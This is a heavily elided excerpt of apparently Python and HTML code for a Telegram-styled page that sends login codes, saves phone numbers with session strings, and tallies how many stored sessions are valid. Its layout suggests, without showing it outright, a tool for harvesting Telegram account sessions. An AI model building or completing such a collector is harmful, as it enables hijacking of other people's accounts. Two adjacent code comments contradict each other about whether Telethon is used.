...
def save_session(phone, session_string):
    ...
    db["sessions"][phone] = {"phone": phone, "file": filename, "created_at": datetime.now().isoformat(), "valid": True}
    db["stats"]["total"] = len(db["sessions"])
    db["stats"]["valid"] = sum(1 for s in db["sessions"].values() if s.get("valid", False))
    save_db(db)
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        .info-text { background: rgba(0,136,204,0.08); border-left: 3px solid #0088cc; padding: 12px 14px; margin-bottom: 20px; border-radius: 6px; font-size: 13px; color: #aaa; line-height: 1.7; }
        ...
        button { width: 100%; padding: 14px; margin-top: 16px; border: none; border-radius: 10px; background: #0088cc; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
...
def send_code():
    ...
    # ИСПОЛЬЗУЕМ TELEGRAM API ЧЕРЕЗ HTTP (БЕЗ TELEГON)
    try:
        # Отправляем код через Telethon (синхронно)
        import asyncio
